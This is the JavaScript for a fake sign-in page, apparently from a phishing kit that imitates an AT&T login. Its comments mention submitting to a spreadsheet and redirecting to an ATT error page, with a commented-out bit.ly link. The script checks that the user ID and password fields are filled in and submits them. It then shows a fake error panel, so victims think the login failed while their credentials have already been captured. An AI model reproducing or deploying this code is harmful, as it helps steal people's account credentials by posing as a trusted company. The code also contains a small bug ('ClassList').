
const emailEl = document.querySelector('#txtUserID');
const passwordEl = document.querySelector('#txtPassword');
const comboEl = document.querySelector('#keep_signIn');
const form = document.querySelector('#att_form');
const submitBtn = document.querySelector('#formRec');
const error_Wrapper = document.querySelector('#error_Wrapper');
const signIn_Wrapper = document.querySelector('#sign_In_Wrapper');

function load_error_Wrapper() {  
//submitBtn.addEventListener("click", function() {
  error_Wrapper.classList.add("active");
  signIn_Wrapper.classList.remove("active");
//});
}

const togglePassword = document.querySelector("#togglePassword");
const password = document.querySelector("#txtPassword");

const showHidePass = document.querySelector('#showHidePass');
const ClearID = document.querySelector('#ClearID');

const showShadow = document.querySelector(".shadow");
const showMessageContainer = document.querySelector(".checkedMessageWrapper");
const boxCheck = document.querySelector(".keep_signIn");
const yes_showMessage = document.querySelector(".btnCheck");
const dont_showMessage = document.querySelector(".btnUnCheck");
const boxChecked = document.querySelector('input[name="Keep_signed_in"]');

$('#keep_signIn').change(function () {
  if (this.checked != true) {
    showMessageContainer.ClassList.remove("active");
    showShadow.classList.remove("active");
  } else {
    showMessageContainer.classList.add("active");
    showShadow.classList.add("active");
  }
});

dont_showMessage.addEventListener("click", function () {
  showMessageContainer.classList.remove("active");
  showShadow.classList.remove("active");
});

yes_showMessage.addEventListener("click", function () {
  showMessageContainer.classList.remove("active");
  showShadow.classList.remove("active");
});

$(document).ready(function () {
  $(".btnCheck").click(function () {
    $("#keep_signIn").prop("checked", true);
  });
  $(".btnUnCheck").click(function () {
    $("#keep_signIn").prop("checked", false);
  });
});

var empty = true;
$('#txtUserID').on('change', function () {
  const showHidePass = document.querySelector('#showHidePass');
  const ClearID = document.querySelector('#ClearID');

  if ($(this).val() != "") {
    ClearID.classList.add('active');
  } else {
    ClearID.classList.remove('active');
  }
});


togglePassword.addEventListener("click", function () {
  // toggle the type attribute
  const type = password.getAttribute("type") === "password" ? "text" : "password";
  password.setAttribute("type", type);

  // toggle the icon
  this.classList.toggle("HIDE");
});

// Redirect to ATT Error Page
// function redirect() {
//  window.location.href = "https://bit.ly/3wFiZpI";
// }


const checkEmail = () => {
let valid = false;

const min = 4,
max = 50;

const email = emailEl.value.trim();
if (!isRequired(email)) {
showError(emailEl, 'This information is required. if you don\'t remember your user ID, use Forget user ID link. ');
} else if (!isBetween(email.length, min, max)) {
showError(emailEl, 'Make sure you enter at least 4 characters.')
} else {
showSuccess(emailEl);
valid = true;
}
return valid;
};

const checkPassword = () => {
let valid = false;

const min = 4,
max = 50;

const password = passwordEl.value.trim();

if (!isRequired(password)) {
showError(passwordEl, 'This information is required. if you don\'t remember your password, use Forget Forget password link.');
} else if (!isBetween(password.length, min, max)) {
showError(passwordEl, 'Make sure you enter at least 4 characters.')
} else {
showSuccess(passwordEl);
valid = true;
}
return valid;
};

const isEmailValid = (email) => {
const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
return re.test(email);
};

const isRequired = value => value === '' ? false : true;
const isBetween = (length, min, max) => length < min || length > max ? false : true;

const showError = (input, message) => {
// get the form-field element
// const formField = input.parentElement;
const formField = input.parentElement.parentElement;

// add the error class
formField.classList.remove('success');
formField.classList.add('error');

// show the error message
const error = formField.querySelector('small');
error.textContent = message;
};

const showSuccess = (input) => {
// get the form-field element
// const formField = input.parentElement;
const formField = input.parentElement.parentElement;

// remove the error class
formField.classList.remove('error');
formField.classList.add('success');

// hide the error message
const error = formField.querySelector('small');
error.textContent = '';
}

//form.addEventListener('submit', function (e) {
form.addEventListener('submit', async function (e) {
// prevent the form from submitting
e.preventDefault();

// validate fields
let isEmailValid = checkEmail(),
isPasswordValid = checkPassword();

let isFormValid = isEmailValid &&
isPasswordValid;

// submit to the Spreadsheet if the form is valid
if (isFormValid) {
//document.getElementById('att_form').submit(); 

form.submit();
load_error_Wrapper();
// Disappear SignIn Wrapper and Appear Error Wrapper

}
});

const debounce = (fn, delay = 500) => {
let timeoutId;
return (...args) => {
// cancel the previous timer
if (timeoutId) {
clearTimeout(timeoutId);
}
// setup a new timer
timeoutId = setTimeout(() => {
fn.apply(null, args)
}, delay);
};
};

form.addEventListener('input', debounce(function (e) {
switch (e.target.id) {
case 'txtUserID':
checkEmail();
break;
case 'txtPassword':
checkPassword();
break;
}


}));
